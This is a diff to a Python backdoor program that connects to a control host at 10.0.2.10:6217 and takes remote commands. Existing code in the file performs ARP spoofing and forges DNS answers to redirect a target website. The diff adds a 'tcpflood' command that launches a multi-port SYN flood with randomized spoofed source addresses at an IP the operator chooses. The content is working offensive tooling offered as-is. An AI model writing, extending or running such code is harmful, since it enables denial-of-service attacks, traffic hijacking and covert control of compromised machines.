@@ -12,6 +12,7 @@ from ctypes import c_bool
 import scapy.all as scapy
 import re
 import netfilterqueue
+import random
 
 
 def execute_system_command(command):
@@ -135,12 +136,10 @@ def process_packet_dns(packet, target_website, modified_ip):
     if scapy_packet.haslayer(scapy.DNSRR):
         qname = scapy_packet[scapy.DNSQR].qname.decode("utf-8")
         if target_website in qname:
-            # create a dns response, keep the name, change the ip to the preferred one
             answer = scapy.DNSRR(rrname=qname, rdata=modified_ip)
             scapy_packet[scapy.DNS].an = answer
             scapy_packet[scapy.DNS].ancount = 1
 
-            # remove variables that would corrupt the modified packet, scapy will auto redefine them
             del scapy_packet[scapy.IP].len
             del scapy_packet[scapy.IP].chksum
             del scapy_packet[scapy.UDP].chksum
@@ -243,6 +242,32 @@ def kill_arp():
                 f.write("0")
     else:
         print('[-] No arp spoof running at the moment.')
+
+
+def randomize_ip():
+    iprange = router_ip.split('.')
+    random_ip = iprange[0] + '.' + iprange[1] + '.' + iprange[2] + '.' + str(random.randrange(2, 254))
+    return random_ip
+
+def randomize_integer():
+    random_int = random.randrange(1, 1024)
+    return random_int
+
+
+def flooding_tcp(port):
+    for _ in range(flood_time):
+        ip_packet = scapy.IP()
+        ip_packet.src = randomize_ip()
+        ip_packet.dst = flood_ip
+
+        tcp_packet = scapy.TCP()
+        tcp_packet.sport = randomize_integer()
+        tcp_packet.dport = port
+        tcp_packet.flags = "S"
+        tcp_packet.seq = randomize_integer()
+        tcp_packet.window = randomize_integer()
+
+        scapy.send(ip_packet/tcp_packet, verbose=False)
 
 
 class Backdoor:
@@ -353,6 +378,19 @@ class Backdoor:
                                 print('[-] No arp spoof running at the moment.')
                         except NameError:
                             print('[-] No arp spoof running at the moment.')
+                    elif command[0] == "tcpflood":
+                        # try:
+                        global flood_ip
+                        global flood_time
+                        flood_ip = command[1]
+                        flood_ports = list(map(int, command[2].translate({ord(i): None for i in '[]'}).split(',')))
+                        flood_time = int(command[3])
+                        pool = multiprocessing.Pool(processes=len(flood_ports))
+                        pool.map(flooding_tcp, flood_ports)
+                        pool.close()
+                        pool.join()
+                        # except:
+                        #     pass
                     elif command[0] == "killarp":
                         try:
                             kill_arp()
@@ -399,6 +437,8 @@ try:
     arp_process = None
     dns_process = None
     hook_process = None
+    flood_ip = None
+    flood_time = None
     router_ip = scapy.conf.route.route("0.0.0.0")[2]
     my_backdoor = Backdoor("10.0.2.10", 6217)
     my_backdoor.run()
